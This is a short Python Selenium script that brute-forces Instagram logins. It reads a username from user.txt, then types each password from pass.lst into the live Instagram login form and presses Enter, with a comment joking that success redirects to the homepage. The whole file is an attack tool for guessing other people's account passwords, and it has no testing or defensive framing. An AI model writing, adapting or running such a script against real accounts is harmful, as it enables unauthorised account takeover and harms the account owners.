from selenium import webdriver
import time
from selenium.webdriver.common.keys import Keys


# get instagram page
driver = webdriver.Chrome()
driver.get("http://www.instagram.com")
time.sleep(2)


# get tags then try pass.txt if succes y'll get redirect into the homepage xD
username = driver.find_element_by_name('username')
password = driver.find_element_by_name('password')
user_txt = open('user.txt', 'r')
for line2 in user_txt:
    username.send_keys(line2)
    time.sleep(2)
    break
pass_lst = open('pass.lst', 'r')

for line in pass_lst:
    password.send_keys(Keys.CONTROL, 'a')
    time.sleep(2)
    password.send_keys(line)
    password.send_keys(Keys.ENTER)
    time.sleep(1)
    print("Last password tried:", line)

# turn idle on
pass_lst.close()
user_txt.close()
